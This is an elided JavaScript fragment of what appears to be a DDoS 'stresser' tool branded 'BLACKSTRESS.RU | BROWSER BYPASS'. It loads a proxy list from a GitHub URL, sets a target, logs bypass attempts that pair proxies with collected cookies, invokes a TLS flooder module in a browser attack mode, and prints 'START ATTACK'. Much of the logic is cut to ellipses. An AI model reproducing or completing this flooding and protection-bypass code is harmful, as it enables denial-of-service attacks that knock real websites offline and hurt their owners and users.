...
let typeAlert = 2;
let PROMOTION = "BLACKSTRESS.RU | BROWSER BYPASS";

//proxy selection
var PROXYURL = `https://raw.githubusercontent.com/louzencc/PROXY/main/http.txt`;
var VarsDefinetions = {
  Objetive: target,
...
log(`H0LLS CREATE` + `[ ${PROMOTION} ]`.cyan);
...
//       });
      ...
      if (typeAlert == 1) {
        ...
        log(
          `[info]` + ` Bypass [START] Proxy: ${Proxy} | Cookies: ${resposense[IdBrowser].split(":::")[0]}`.cyan );
      } else {
  ...
  if (ModeATTACK == "browser") {
    ...
    log(`Target: ${target}`);
    require("./browser/flooder").flooderTLS(
      (option = {
  ...
  function setFlooder(ip,cookie,ua) {
    ...
    log(`[info]`+` START ATTACK ${ip}`.yellow);
  }
